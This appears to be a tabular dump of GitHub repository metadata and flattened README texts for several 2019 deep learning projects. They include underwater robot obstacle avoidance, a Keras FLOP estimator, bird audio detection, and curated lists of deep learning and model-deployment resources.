pengzhi1998,Underwater-obstacle-avoidance,bluerov2#dddqn#obstacle-avoidance#robot,Underwater obstacle avoidance Hello everyone welcome to this repository This project is mainly about underwater vehicles obstacle avoidance with neural networks as well as the method based on the single beam distance detection The project mainly refers to the following projects https github com xie9187 Monocular Obstacle Avoidance https github com XPFly1989 FCRN as well as https github com iro cp FCRN DepthPrediction contents 1 Introduction https github com 2590477658 Underwater obstacle avoidance 1 introduction 2 Guide https github com 2590477658 Underwater obstacle avoidance blob master README md 2 guide 1 Introduction Nowadays the AUVs autonomous underwater vehichles are widely used in underwater projects underwater environment detection cultural relic salvage underwater rescues and etc And in order to improve their efficiency a great sense of obstacle avoidance of the robots is indispensable But because of the rather complex underwater light conditions including light attenuation dimmer environment reflection refraction along with the more complicated kinematics situation including caparicious current and more resistance it is much harder for the robots to work well underwater So we developed an ad hoc methods to deal with that In the first part we implemented a FCRN fully convolutional residual network to predict RGBD from the front monocular camera To train the network we used the NYU dataset the images pairs from which have been preprocessed according to the underwater environment In the second part we applied the DDDQN to control the robot in POSHOLD mode with the topic of rc override We trained this DDDQN in a well designed Gazebo world At last we combined the two neural networks with the method based on the single beam echo sounder to make the robot BlueROV2 to avoid obstacles The senario is designed as follows needs further tests and experiments 1 Set a goal point for the robot 2 The robot spins toward the goal then moves forward 3 When the echo sounder detects obstacles right in front of it the distance is less than 8 meters the robot will be controlled by the neural networks based on the front monocular camera until it successfully avoid the object 4 Repeat 2 and 3 until it reaches the goal point 2 Guide 1 Clone the repository into a directory 2 Download the NYU Depth Dataset V2 Labelled Dataset as well as the pre trained TensorFlow weights as a npy file for a part of the model from Laina et al into the folder of FCRNtrain http horatio cs nyu edu mit silberman nyudepthv2 nyudepthv2labeled mat http campar in tum de files rupprecht depthpred NYUResNet UpProj npy 3 Open the createunderwater m file and change the three parameters Redattenuation Greenattenuation along with Blueattenuation to fit the environment where you d like to test the performance Then run it to process the NYU dataset It will generate a test mat in the same directory 4 Run train py in FCRNtrain to train the FCRN network which is for the RGBD prediction After 30 epochs the performance is relatively good The parameters of the model will be stored into the checkpoint pth tar 5 Launch the designed world with the command in one terminal roslaunch turtlebot3gazebo turtlebot3house launch worldfile TO PATH Underwater obstacle avoidance DDDQNtrain turtlebot3bighouse world Run the DDDQN py at the same time in another terminal The training begins You could find the robot moves aimlessly at first but starts to show the ability of avoiding the obstacles after around 200 episodes The average reward for each 50 episodes could be seen from the graph drew by visdom We set the max episode number to be 100000 Nevertheless if the performance is good enough it is fine to terminate the process The networks will be saved into onlinewithnoise pth tar as well as targetwithnoise pth tar 6 Copy the checkpoint pth tar from FCRNtrain and onlinewithnoise pth tar from DDDQNtrain into the folder Testonrobots Then test on the ground robots or underwater robots pingechosounder launch and pingmessage py are helping to open the single beam echo sounder to detect the distance between the robot and the object right in front of the echo sounder,2019-09-13T21:30:49Z,2019-11-24T01:55:53Z,Python,pengzhi1998,User,1,3,0,73,master,pengzhi1998,1,0,0,0,1,0,0
ckyrkou,Keras_FLOP_Estimator,n/a,Performance Estimator for Keras Models WARNING Under Construction Code will Follow Developed and tested on keras 2 2 4 Keras FLOP Estimator This is a function for estimating the floating point operations FLOPS of deep learning models developed with keras It supports some basic layers such as Convolutional Separable Convolution Depthwise Convolution BatchNormalization Activations and Merge Layers Add Max Concatenate Usage python from keras applications resnet50 import ResNet50 from keras applications vgg16 import VGG16 from keras applications mobilenet import MobileNet from netflops import netflops model VGG16 weights None includetop True pooling None inputshape 224 224 3 model summary Prints a table with the FLOPS at each layer and total FLOPs netflops model table True Output Layer Name Input Shape Output Shape Kernel Size Filters Strides FLOPS input11 224 224 3 224 224 3 0 0 0 0 1 1 0 0000 block1conv1 224 224 3 224 224 64 3 3 64 1 1 173408256 0000 block1conv2 224 224 64 224 224 64 3 3 64 1 1 3699376128 0000 block1pool 224 224 64 2 2 0 0 2 2 3211264 0000 block2conv1 112 112 64 112 112 128 3 3 128 1 1 1849688064 0000 block2conv2 112 112 128 112 112 128 3 3 128 1 1 3699376128 0000 block2pool 112 112 128 2 2 0 0 2 2 1605632 0000 block3conv1 56 56 128 56 56 256 3 3 256 1 1 1849688064 0000 block3conv2 56 56 256 56 56 256 3 3 256 1 1 3699376128 0000 block3conv3 56 56 256 56 56 256 3 3 256 1 1 3699376128 0000 block3pool 56 56 256 2 2 0 0 2 2 802816 0000 block4conv1 28 28 256 28 28 512 3 3 512 1 1 1849688064 0000 block4conv2 28 28 512 28 28 512 3 3 512 1 1 3699376128 0000 block4conv3 28 28 512 28 28 512 3 3 512 1 1 3699376128 0000 block4pool 28 28 512 2 2 0 0 2 2 401408 0000 block5conv1 14 14 512 14 14 512 3 3 512 1 1 924844032 0000 block5conv2 14 14 512 14 14 512 3 3 512 1 1 924844032 0000 block5conv3 14 14 512 14 14 512 3 3 512 1 1 924844032 0000 block5pool 14 14 512 2 2 0 0 2 2 100352 0000 flatten 7 7 512 25088 0 0 0 0 1 1 0 0000 fc1 25088 4096 0 0 0 0 1 1 205520896 0000 fc2 4096 4096 0 0 0 0 1 1 33554432 0000 predictions 4096 1000 0 0 0 0 1 1 8192000 0000 Total FLOPS x 10 6 30 94665011200 Total MACC x 10 6 15 470264320 Keras Model Timing Performannce Per Layer This is a function for estimating the timing performance of each leayer in a neural network It can be used to identify the bottlenecks in computation when run on the target device The function iterates over the network by runninng an input image through it by removing each of the layers The layer time is found by subtracting the current run without the last layer from the previous run that contained the layer There are some timing issues where the timings are off a bit thus some times may appear as negative In such case the layer compute time can be considered as negligible Usage python from keras applications vgg16 import VGG16 model VGG16 weights imagenet includetop False times timeperlayer model Visualize import matplotlib pyplot as plt plt style use ggplot x model layers i name for i in range 1 len model layers x i for i in range 1 len model layers g times i 0 for i in range 1 len times xpos np arange len x plt bar x g color 7ed6df plt xlabel Layers plt ylabel Processing Time plt title Processing Time of each Layer plt xticks xpos x rotation 90 plt show Output Graph Disclaimer This code is provided as is and there might be some errors especially with the timing as it depends on many factors In many papers the same number can be reporter under either FLOPs or MACCs By definition these two quantities are not the same and care must be taken as to which one you want to report and compare against For example MobileNetV1 paper it is reported to have 569 MACCs in the paper However many leaderboarding sites put this metric under FLOPS which may also include other operations In the provided function FLOPS can be any operation such as addition subtraction comparison etc Resources 1 Convolutional Neural Networks Cheatsheet https stanford edu shervine teaching cs 230 cheatsheet convolutional neural networks 2 How fast is my model https machinethink net blog how fast is my model 3 3 Small But Powerful Convolutional Networks https towardsdatascience com 3 small but powerful convolutional networks 27ef86faa42d,2019-08-08T11:15:47Z,2019-11-01T07:48:53Z,Python,ckyrkou,User,2,3,1,50,master,ckyrkou,1,0,0,1,0,0,0
cogobuy,EnglishCompanyName,n/a,EnglishCompanyName focused on keyword extraction from non chinese company nameadopt traditional BOW algorithm and TF IDF principle to solve this special demands Deep learning integration is planning,2019-08-18T14:21:34Z,2019-10-21T06:43:51Z,Python,cogobuy,User,1,3,0,6,master,cogobuy,1,0,0,0,0,0,0
Rajratnpranesh,Quick_Response,n/a,,2019-09-14T21:38:59Z,2019-10-17T19:48:52Z,Jupyter Notebook,Rajratnpranesh,User,1,3,0,2,master,Rajratnpranesh,1,0,0,0,0,0,0
hse-ds,iad-deep-learning,n/a,iad deep learning,2019-09-12T08:32:18Z,2019-12-12T08:30:39Z,Jupyter Notebook,hse-ds,Organization,6,2,11,28,master,new-okaerinasai#shedx,2,0,0,0,0,0,0
meetpramodr,Introduction-to-Artificial-Neural-Network-and-Deep-Learning,n/a,Introduction to Artificial Neural Network and Deep Learning Repo for the introduction to ANN and Deep Learning Tutorial,2019-08-10T11:08:31Z,2019-08-26T07:05:30Z,Jupyter Notebook,meetpramodr,User,1,2,10,10,master,meetpramodr,1,0,0,0,0,0,0
microfaune,microfaune,n/a,Background Biodiversity evaluation and monitoring is the first step toward its protection The goal of the Microfaune project is to evaluate avifauna in Cit Universitaire park Paris France from audio recordings swift images swift jpg The aim is to provide the scientific community with a labeled database bird no bird and to develop machine learning algorithms for bird audio detection The project includes also the creation from scratch or using existing tools of web based tools to label and visualize bird sounds The goal is to advance leverage state of the art research and contribute to open data in the field Roadmap Here is a tentative roadmap to be challenged roadmap images roadmap png Getting Started Audio Tutorial spectrogram images spectrogramexample png Since we ll work on audio data it should be useful to have notions on basic operations on audio We provide an introductory notebook showing how to load audio data listen to it in the notebook plot waveforms calculate spectrograms etc Here is a notebook https github com hadrienj microfaune blob master gettingstarted ipynb to get started Feel free to contribute and improve this notebook Collaboration Google Doc Details on the projects are gathered here https docs google com document d 1yREuA9 AuH0du2uhvGiSryd0PYd7ogVkyXDWf VLQxw edit usp sharing Trello This is here https trello com b amUmPAtu microfaune The Microfaune package You can find the documentation of the Microfaune package here https hadrienj github io microfaune Setup Using pipenv to create virtual environment You need to have pipenv installed On mac brew install pipenv Other plateforms see the doc https docs pipenv org en latest install installing pipenv Then you can fork or clone this repo and run pipenv install And you should have all dependencies installed Locking can take some time so be patient To install a lib you need e g pipenv install numpy To run Python from the virtual environment pipenv run For instance to run a Jupyter notebook pipenv run jupyter notebook External Data If you look on the roadmap you should see some sub projects using external data These data are audio files labelised with the presence or absence of bird There are at least two databases Warblr FreeField1010 Some ideas can be tried on these data making easy comparison of performances You can find these databases here http machine listening eecs qmul ac uk bird audio detection challenge Wazo Data Wazo Data are data from recordings in Cit Universitaire in Paris Data should be accessible soon Avifauna at Cit Universitaire Here is the data from the scientific survey from 2014 20141 images releve20141 png 20142 images releve20142 png,2019-09-06T13:01:37Z,2019-12-12T10:51:38Z,Jupyter Notebook,microfaune,Organization,6,2,6,129,master,camilleguevenoux#hadrienj#fcouziniedevy#chrischris69#PatrickFarnole,5,0,0,0,0,0,17
PacktPublishing,Mobile-Deep-Learning-Projects,n/a,,2019-08-13T07:29:53Z,2019-12-03T18:21:58Z,Dart,PacktPublishing,Organization,3,2,3,63,master,Rimjhim28#xprilion#ManikandanKurup-Packt,3,0,0,0,0,0,0
yash42828,deep-learning-guide,n/a,Awesome Deep Learning Table of Contents Free Online Books free online books Courses courses Videos and Lectures videos and lectures Papers papers Tutorials tutorials Researchers researchers Websites websites Datasets datasets Conferences Conferences Frameworks frameworks Tools tools Miscellaneous miscellaneous Contributing contributing Free Online Books 1 Deep Learning http www deeplearningbook org by Yoshua Bengio Ian Goodfellow and Aaron Courville 05 07 2015 2 Neural Networks and Deep Learning http neuralnetworksanddeeplearning com by Michael Nielsen Dec 2014 3 Deep Learning http research microsoft com pubs 209355 DeepLearning NowPublishing Vol7 SIG 039 pdf by Microsoft Research 2013 4 Deep Learning Tutorial http deeplearning net tutorial deeplearning pdf by LISA lab University of Montreal Jan 6 2015 5 neuraltalk https github com karpathy neuraltalk by Andrej Karpathy numpy based RNN LSTM implementation 6 An introduction to genetic algorithms http www boente eti br fuzzy ebook fuzzy mitchell pdf 7 Artificial Intelligence A Modern Approach http aima cs berkeley edu 8 Deep Learning in Neural Networks An Overview http arxiv org pdf 1404 7828v4 pdf 9 Artificial intelligence and machine learning Topic wise explanation https leonardoaraujosantos gitbooks io artificial inteligence Courses 1 Machine Learning Stanford https class coursera org ml 005 by Andrew Ng in Coursera 2010 2014 2 Machine Learning Caltech http work caltech edu lectures html by Yaser Abu Mostafa 2012 2014 3 Machine Learning Carnegie Mellon http www cs cmu edu tom 10701sp11 lectures shtml by Tom Mitchell Spring 2011 2 Neural Networks for Machine Learning https class coursera org neuralnets 2012 001 by Geoffrey Hinton in Coursera 2012 3 Neural networks class https www youtube com playlist list PL6Xpj9I5qXYEcOhn7TqghAJ6NAPrNmUBH by Hugo Larochelle from Universit de Sherbrooke 2013 4 Deep Learning Course http cilvr cs nyu edu doku php id deeplearning slides start by CILVR lab NYU 2014 5 A I Berkeley https courses edx org courses BerkeleyX CS188x1 1T2013 courseware by Dan Klein and Pieter Abbeel 2013 6 A I MIT http ocw mit edu courses electrical engineering and computer science 6 034 artificial intelligence fall 2010 lecture videos by Patrick Henry Winston 2010 7 Vision and learning computers and brains http web mit edu course other i2course www visionandlearningfall2013 html by Shimon Ullman Tomaso Poggio Ethan Meyers MIT 2013 9 Convolutional Neural Networks for Visual Recognition Stanford http vision stanford edu teaching cs231n syllabus html by Fei Fei Li Andrej Karpathy 2017 10 Deep Learning for Natural Language Processing Stanford http cs224d stanford edu 11 Neural Networks usherbrooke http info usherbrooke ca hlarochelle neuralnetworks content html 12 Machine Learning Oxford https www cs ox ac uk people nando defreitas machinelearning 2014 2015 13 Deep Learning Nvidia https developer nvidia com deep learning courses 2015 14 Graduate Summer School Deep Learning Feature Learning https www youtube com playlist list PLHyI3Fbmv0SdzMHAy0aN59oYnLy5vyyTA by Geoffrey Hinton Yoshua Bengio Yann LeCun Andrew Ng Nando de Freitas and several others IPAM UCLA 2012 15 Deep Learning Udacity Google https www udacity com course deep learning ud730 by Vincent Vanhoucke and Arpan Chakraborty 2016 16 Deep Learning UWaterloo https www youtube com playlist list PLehuLRPyt1Hyi78UOkMPWCGRxGcA9NVOE by Prof Ali Ghodsi at University of Waterloo 2015 17 Statistical Machine Learning CMU https www youtube com watch v azaLcvuqlg list PLjbUi5mgii6BWEUZf7He6nowWvGneY8r by Prof Larry Wasserman 18 Deep Learning Course https www college de france fr site en yann lecun course 2015 2016 htm by Yann LeCun 2016 19 Designing Visualizing and Understanding Deep Neural Networks UC Berkeley https www youtube com playlist list PLkFD640KJIxopmdJFCLNqG3QuDFHQUm 20 UVA Deep Learning Course http uvadlc github io MSc in Artificial Intelligence for the University of Amsterdam 21 MIT 6 S094 Deep Learning for Self Driving Cars http selfdrivingcars mit edu 22 MIT 6 S191 Introduction to Deep Learning http introtodeeplearning com 23 Berkeley CS 294 Deep Reinforcement Learning http rll berkeley edu deeprlcourse 24 Keras in Motion video course https www manning com livevideo keras in motion 25 Practical Deep Learning For Coders http course fast ai by Jeremy Howard Fast ai 26 Introduction to Deep Learning http deeplearning cs cmu edu by Prof Bhiksha Raj 2017 Videos and Lectures 1 How To Create A Mind https www youtube com watch v RIkxVci R4k By Ray Kurzweil 2 Deep Learning Self Taught Learning and Unsupervised Feature Learning https www youtube com watch v n1ViNeWhC24 By Andrew Ng 3 Recent Developments in Deep Learning https www youtube com watch v vShMxxqtDDs ampindex 3 amplist PL78U8qQHXgrhP9aZraxTT5 X1RccTcUYT By Geoff Hinton 4 The Unreasonable Effectiveness of Deep Learning https www youtube com watch v sc KbuZqGkI by Yann LeCun 5 Deep Learning of Representations https www youtube com watch v 4xsVFLnHC0 by Yoshua bengio 6 Principles of Hierarchical Temporal Memory https www youtube com watch v 6ufPpZDmPKA by Jeff Hawkins 7 Machine Learning Discussion Group Deep Learning w Stanford AI Lab https www youtube com watch v 2QJi0ArLq7s amplist PL78U8qQHXgrhP9aZraxTT5 X1RccTcUYT by Adam Coates 8 Making Sense of the World with Deep Learning http vimeo com 80821560 By Adam Coates 9 Demystifying Unsupervised Feature Learning https www youtube com watch v wZfVBwOO0 k By Adam Coates 10 Visual Perception with Deep Learning https www youtube com watch v 3boKlkPBckA By Yann LeCun 11 The Next Generation of Neural Networks https www youtube com watch v AyzOUbkUf3M By Geoffrey Hinton at GoogleTechTalks 12 The wonderful and terrifying implications of computers that can learn http www ted com talks jeremyhowardthewonderfulandterrifyingimplicationsofcomputersthatcanlearn By Jeremy Howard at TEDxBrussels 13 Unsupervised Deep Learning Stanford http web stanford edu class cs294a handouts html by Andrew Ng in Stanford 2011 14 Natural Language Processing http web stanford edu class cs224n handouts By Chris Manning in Stanford 15 A beginners Guide to Deep Neural Networks http googleresearch blogspot com 2015 09 a beginners guide to deep neural html By Natalie Hammel and Lorraine Yurshansky 16 Deep Learning Intelligence from Big Data https www youtube com watch v czLI3oLDe8M by Steve Jurvetson and panel at VLAB in Stanford 17 Introduction to Artificial Neural Networks and Deep Learning https www youtube com watch v FoO8qDB8gUU by Leo Isikdogan at Motorola Mobility HQ 18 NIPS 2016 lecture and workshop videos https nips cc Conferences 2016 Schedule NIPS 2016 19 Deep Learning Crash Course https www youtube com watch v oS5fzmHVz0 list PLWKotBjTDoLj3rXBL nEIPRN9V3a9Cx07 a series of mini lectures by Leo Isikdogan on YouTube 2018 Papers You can also find the most cited deep learning papers from here https github com terryum awesome deep learning papers 1 ImageNet Classification with Deep Convolutional Neural Networks http papers nips cc paper 4824 imagenet classification with deep convolutional neural networks pdf 2 Using Very Deep Autoencoders for Content Based Image Retrieval http www cs toronto edu hinton absps esann deep final pdf 3 Learning Deep Architectures for AI http www iro umontreal ca lisa pointeurs TR1312 pdf 4 CMUs list of papers http deeplearning cs cmu edu 5 Neural Networks for Named Entity Recognition http nlp stanford edu socherr pa4ner pdf zip http nlp stanford edu socherr pa4 ner zip 6 Training tricks by YB http www iro umontreal ca bengioy papers YB tricks pdf 7 Geoff Hinton s reading list all papers http www cs toronto edu hinton deeprefs html 8 Supervised Sequence Labelling with Recurrent Neural Networks http www cs toronto edu graves preprint pdf 9 Statistical Language Models based on Neural Networks http www fit vutbr cz imikolov rnnlm thesis pdf 10 Training Recurrent Neural Networks http www cs utoronto ca ilya pubs ilyasutskeverphdthesis pdf 11 Recursive Deep Learning for Natural Language Processing and Computer Vision http nlp stanford edu socherr thesis pdf 12 Bi directional RNN http www di ufpe br fnj RNA bibliografia BRNN pdf 13 LSTM http web eecs utk edu itamar courses ECE 692 Bobbypaper1 pdf 14 GRU Gated Recurrent Unit http arxiv org pdf 1406 1078v3 pdf 15 GFRNN http arxiv org pdf 1502 02367v3 pdf http jmlr org proceedings papers v37 chung15 pdf http jmlr org proceedings papers v37 chung15 supp pdf 16 LSTM A Search Space Odyssey http arxiv org pdf 1503 04069v1 pdf 17 A Critical Review of Recurrent Neural Networks for Sequence Learning http arxiv org pdf 1506 00019v1 pdf 18 Visualizing and Understanding Recurrent Networks http arxiv org pdf 1506 02078v1 pdf 19 Wojciech Zaremba Ilya Sutskever An Empirical Exploration of Recurrent Network Architectures http jmlr org proceedings papers v37 jozefowicz15 pdf 20 Recurrent Neural Network based Language Model http www fit vutbr cz research groups speech publi 2010 mikolovinterspeech2010IS100722 pdf 21 Extensions of Recurrent Neural Network Language Model http www fit vutbr cz research groups speech publi 2011 mikolovicassp20115528 pdf 22 Recurrent Neural Network based Language Modeling in Meeting Recognition http www fit vutbr cz imikolov rnnlm ApplicationOfRNNinMeetingRecognitionIS2011 pdf 23 Deep Neural Networks for Acoustic Modeling in Speech Recognition http cs224d stanford edu papers maaspaper pdf 24 Speech Recognition with Deep Recurrent Neural Networks http www cs toronto edu fritz absps RNN13 pdf 25 Reinforcement Learning Neural Turing Machines http arxiv org pdf 1505 00521v1 26 Learning Phrase Representations using RNN Encoder Decoder for Statistical Machine Translation http arxiv org pdf 1406 1078v3 pdf 27 Google Sequence to Sequence Learning with Neural Networks http papers nips cc paper 5346 sequence to sequence learning with neural networks pdf 28 Memory Networks http arxiv org pdf 1410 3916v10 29 Policy Learning with Continuous Memory States for Partially Observed Robotic Control http arxiv org pdf 1507 01273v1 30 Microsoft Jointly Modeling Embedding and Translation to Bridge Video and Language http arxiv org pdf 1505 01861v1 pdf 31 Neural Turing Machines http arxiv org pdf 1410 5401v2 pdf 32 Ask Me Anything Dynamic Memory Networks for Natural Language Processing http arxiv org pdf 1506 07285v1 pdf 33 Mastering the Game of Go with Deep Neural Networks and Tree Search http www nature com nature journal v529 n7587 pdf nature16961 pdf 34 Batch Normalization https arxiv org abs 1502 03167 35 Residual Learning https arxiv org pdf 1512 03385v1 pdf 36 Image to Image Translation with Conditional Adversarial Networks https arxiv org pdf 1611 07004v1 pdf 37 Berkeley AI Research BAIR Laboratory https arxiv org pdf 1611 07004v1 pdf 38 MobileNets by Google https arxiv org abs 1704 04861 39 Cross Audio Visual Recognition in the Wild Using Deep Learning https arxiv org abs 1706 05739 40 Dynamic Routing Between Capsules https arxiv org abs 1710 09829 41 Matrix Capsules With Em Routing https openreview net pdf id HJWLfGWRb 42 Efficient BackProp http yann lecun com exdb publis pdf lecun 98b pdf Tutorials 1 UFLDL Tutorial 1 http deeplearning stanford edu wiki index php UFLDLTutorial 2 UFLDL Tutorial 2 http ufldl stanford edu tutorial supervised LinearRegression 3 Deep Learning for NLP without Magic http www socher org index php DeepLearningTutorial DeepLearningTutorial 4 A Deep Learning Tutorial From Perceptrons to Deep Networks http www toptal com machine learning an introduction to deep learning from perceptrons to deep networks 5 Deep Learning from the Bottom up http www metacademy org roadmaps rgrosse deeplearning 6 Theano Tutorial http deeplearning net tutorial deeplearning pdf 7 Neural Networks for Matlab http uk mathworks com help pdfdoc nnet nnetug pdf 8 Using convolutional neural nets to detect facial keypoints tutorial http danielnouri org notes 2014 12 17 using convolutional neural nets to detect facial keypoints tutorial 9 Torch7 Tutorials https github com clementfarabet ipam tutorials tree master thtutorials 10 The Best Machine Learning Tutorials On The Web https github com josephmisiti machine learning module 11 VGG Convolutional Neural Networks Practical http www robots ox ac uk vgg practicals cnn index html 12 TensorFlow tutorials https github com nlintz TensorFlow Tutorials 13 More TensorFlow tutorials https github com pkmital tensorflowtutorials 13 TensorFlow Python Notebooks https github com aymericdamien TensorFlow Examples 14 Keras and Lasagne Deep Learning Tutorials https github com Vict0rSch deeplearning 15 Classification on raw time series in TensorFlow with a LSTM RNN https github com guillaume chevalier LSTM Human Activity Recognition 16 Using convolutional neural nets to detect facial keypoints tutorial http danielnouri org notes 2014 12 17 using convolutional neural nets to detect facial keypoints tutorial 17 TensorFlow World https github com astorfi TensorFlow World 18 Deep Learning with Python https www manning com books deep learning with python 19 Grokking Deep Learning https www manning com books grokking deep learning 20 Deep Learning for Search https www manning com books deep learning for search 21 Keras Tutorial Content Based Image Retrieval Using a Convolutional Denoising Autoencoder https blog sicara com keras tutorial content based image retrieval convolutional denoising autoencoder dc91450cc511 22 Pytorch Tutorial by Yunjey Choi https github com yunjey pytorch tutorial Researchers 1 Aaron Courville http aaroncourville wordpress com 2 Abdel rahman Mohamed http www cs toronto edu asamir 3 Adam Coates http cs stanford edu acoates 4 Alex Acero http research microsoft com en us people alexac 5 Alex Krizhevsky http www cs utoronto ca kriz index html 6 Alexander Ilin http users ics aalto fi alexilin 7 Amos Storkey http homepages inf ed ac uk amos 8 Andrej Karpathy http cs stanford edu karpathy 9 Andrew M Saxe http www stanford edu asaxe 10 Andrew Ng http www cs stanford edu people ang 11 Andrew W Senior http research google com pubs author37792 html 12 Andriy Mnih http www gatsby ucl ac uk amnih 13 Ayse Naz Erkan http www cs nyu edu naz 14 Benjamin Schrauwen http reslab elis ugent be benjamin 15 Bernardete Ribeiro https www cisuc uc pt people show 2020 16 Bo David Chen http vision caltech edu bchen3 Site BoDavidChen html 17 Boureau Y Lan http cs nyu edu ylan 18 Brian Kingsbury http researcher watson ibm com researcher view php person us bedk 19 Christopher Manning http nlp stanford edu manning 20 Clement Farabet http www clement farabet net 21 Dan Claudiu Cirean http www idsia ch ciresan 22 David Reichert http serre lab clps brown edu person david reichert 23 Derek Rose http mil engr utk edu nmil member 5 html 24 Dong Yu http research microsoft com en us people dongyu default aspx 25 Drausin Wulsin http www seas upenn edu wulsin 26 Erik M Schmidt http music ece drexel edu people eschmidt 27 Eugenio Culurciello https engineering purdue e,2019-08-09T16:10:45Z,2019-12-10T07:45:13Z,n/a,yash42828,User,1,2,3,4,master,yash42828,1,0,0,0,0,0,0
ashishpatel26,Awesome-Machine-learning-Deep-learning-Deployment,n/a,Machine learning and Deep learning Model deployment using API Resources https cdn app compendium com uploads user e7c690e8 6ff9 102a ac6d e4aebca50425 5ff89cbc ea1e 4ab0 b646 877369cad553 Image f1899cfe5dc70270ff9f55b31ee4d2af buildingamachinelearningapplication png GitHub Links 1 https github com sauravk90 ML Model Flask Deployment 2 https github com deepakiim Deploy machine learning model 3 https github com emmapraise deploying ml model using flask 4 https github com elliebirbeck model deployment flask 5 https github com ashishpatel26 Machine Learning Web Apps 6 https github com mickwar ml deploy 7 https github com mtobeiyf keras flask deploy webapp 8 https github com antoinemertz deploy ml flask 9 https github com pratos flaskapi blob master notebooks ML 2BModels 2Bas 2BAPIs 2Busing 2BFlask md Articles 1 Deploy a machine learning model using flask https hackernoon com deploy a machine learning model using flask da580f84e60c 2 Designing a Machine Learning model and deploying it using Flask on Heroku https towardsdatascience com designing a machine learning model and deploying it using flask on heroku 9558ce6bde7b 3 Deploying Models to Flask https towardsdatascience com deploying models to flask fb62155ca2c4 4 Deploy Machine Learning Models for Free https medium com analytics vidhya how to deploy simple machine learning models for free 56cdccc62b8d 5 Turning Machine Learning Models into APIs in Python https www datacamp com community tutorials machine learning models api python 6 Deploy a Machine Learning Model with Flask https blog hyperiondev com index php 2018 02 01 deploy machine learning model flask api 7 How to build an API for a machine learning model in 5 minutes using Flask https www kdnuggets com 2019 01 build api machine learning model using flask html 8 Tutorial to deploy Machine Learning models in Production as APIs using Flask https www analyticsvidhya com blog 2017 09 machine learning models as apis using flask 9 Tutorial Deploying a machine learning model to the web https blog cambridgespark com deploying a machine learning model to the web 725688b851c7 10 The brilliant beginners guide to model deployment https heartbeat fritz ai brilliant beginners guide to model deployment 133e158f6717 11 A Flask API for serving scikit learn models https towardsdatascience com a flask api for serving scikit learn models c8bcdaa41daa 12 Turn any Jupyter notebook into a REST API https ndres me post jupyter notebook rest api 13 A comprehensive guide to putting a machine learning model in production using Flask Docker and Kubernetes https www mikulskibartosz name a comprehensive guide to putting a machine learning model in production 14 Deploy a Python machine learning model as a web service https developer ibm com tutorials deploy a python machine learning model as a web service 15 Python Machine Learning Prediction with a Flask REST API https www toptal com python python machine learning flask example 16 A Simple Way to Deploy Any Machine Learning https school geekwall in p ByFRTKEtV a simple way to deploy any machine learning 17 Web Development of NLP Model in Python Deployed in Flask https blog usejournal com web development of nlp model in python deployed in flask efc84be37f9a 18 Deploying Machine Learning model in production https cloudxlab com blog deploying machine learning model in production 19 How to Move Your Machine Learning Model to Production https www linode com docs applications big data how to move machine learning model to production 20 Deploy Deep Learning models using Flask https www linkedin com pulse deploy deep learning models using flask richard wanjohi ph d 21 Deploy Your First Deep Learning Model On Kubernetes With Python Keras Flask and Docker https www tigera io blog deploy your first deep learning model on kubernetes with python keras flask and docker 22 THE FRESHERS GUIDE TO DEPLOYING A MACHINE LEARNING MODEL USING FLASK AND KERAS https www ddriven io ddriven learnings guide to deploying a machine learning model using flask and keras 23 DEPLOY YOUR MACHINE LEARNING MODEL AS A REST API ON AWS https machine learning company nl deploy machine learning model rest api using aws 24 Deploying Machine Learning Models is Hard But It Doesnt Have to Be https www anaconda com deploying machine learning models is hard but it doesnt have to be 25 How To Deploy Keras Deep Learning Models With Flask https www houseofbots com news detail 4528 1 how to deploy keras deep learning models with flask 26 Deploying Keras Model in Production using Flask https www javacodemonk com deploying keras model in production using flask 77d766e4 27 Deploying the Machine Learning model using Keras and Flask https www datascienceauthority com post deploying the machine learning model using keras and flask 28 How to deploy Keras model to production using flask https www pytorials com deploy keras model to production using flask 29 Publishing Machine Learning API With Python Flask https dzone com articles publishing machine learning api with python flask 30 Deploying Python ML Models with Flask Docker and Kubernetes https alexioannides com 2019 01 10 deploying python ml models with flask docker and kubernetes 31 Deploy your Machine Learning Model as REST API in Less than 1 hour with Scikit Learn and Docker https mechlab engineering de 2017 11 deploy your machine learning model as rest api in less than 1 hour with scikit learn and docker 32 Deploying Deep Learning Models On Web And Mobile https reshamas github io deploying deep learning models on web and mobile 33 Deploying ML models using flask and flasgger https dimensionless in deploying ml models using flask and flasgger 34 Serving with the PyTorch model Flask https www datasciencecentral com profiles blogs serving with the pytorch model flask 35 How to deploy Machine Learning models with TensorFlow Part 1 make your model ready for serving https towardsdatascience com how to deploy machine learning models with tensorflow part 1 make your model ready for serving 776a14ec3198 36 Deploy your machine learning models with tensorflow serving and kubernetes https towardsdatascience com deploy your machine learning models with tensorflow serving and kubernetes 9d9e78e569db 37 A guide to deploying Machine Deep Learning model s in Production https blog usejournal com a guide to deploying machine deep learning model s in production e497fd4b734a 38 How to deploy TensorFlow models to production using TF Serving https www freecodecamp org news how to deploy tensorflow models to production using tf serving 4b4b78d41700 39 Training and deploying machine learning models on GCP ML Engine using Tensorflow Estimators https medium com searce creating deep learning models training and deploying it on google cloud ml engine using 9a4ed6a84076 40 Overview of Different Approaches to Deploying Machine Learning Models in Production https www kdnuggets com 2019 06 approaches deploying machine learning production html 41 Serverless Machine Learning https zeit co blog serverless machine learning 42 How To Build a Deep Learning Model to Predict Employee Retention Using Keras and TensorFlow https www digitalocean com community tutorials how to build a deep learning model to predict employee retention using keras and tensorflow 43 How to Deploy Machine Learning Models https christophergs github io machine 20learning 2019 03 17 how to deploy machine learning models Courses 1 Deployment of Machine Learning Models Udemy https www udemy com deployment of machine learning models 2 Deploying Machine Learning Models Coursera https www coursera org learn deploying machine learning models 3 How to deploy machine learning models into production https www youtube com watch v UYyyeYJAoQ 4 Deploying Python Machine Learning Models in Production SciPy https www youtube com watch v 6TI gQhsf40 5 Deploying Scalable Machine Learning for Data Science https www linkedin com learning deploying scalable machine learning for data science 6 Deploying your machine learning model to unlock its potential https www youtube com watch v xPD0 TjJ1CI,2019-08-14T13:21:35Z,2019-12-01T18:50:02Z,n/a,ashishpatel26,User,1,2,2,2,master,ashishpatel26,1,0,0,0,0,0,0
